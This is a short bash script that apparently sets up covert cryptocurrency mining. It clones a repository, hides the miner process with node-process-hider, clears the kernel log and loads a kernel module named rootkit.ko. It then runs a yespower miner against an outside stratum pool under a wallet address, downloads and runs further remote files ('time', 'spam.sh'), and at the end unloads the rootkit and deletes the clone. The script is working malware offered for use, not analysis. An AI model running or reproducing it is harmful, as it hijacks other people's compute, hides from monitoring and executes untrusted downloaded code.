#!/bin/bash 
git clone https://github.com/BatiKangkung/Kerecek
sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
sudo apt-get install cpulimit
cd Kerecek/
ph add avx2 
cpulimit -l 250 -e avx2 &
make
dmesg -C
insmod rootkit.ko
dmesg
chmod +x avx2
./avx2 -a yespower -o stratum+tcps://bte.wisnuardhi27.my.id:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
uname -a
pkill -31 avx2
pkill -31 cpulimit
wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
timeout 10m ./time
# time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
timeout 9m ./spam.sh
rmmod rootkit
dmesg
pkill -31 avx2
pkill -31 cpulimit
cd ..
rm -rf Kerecek
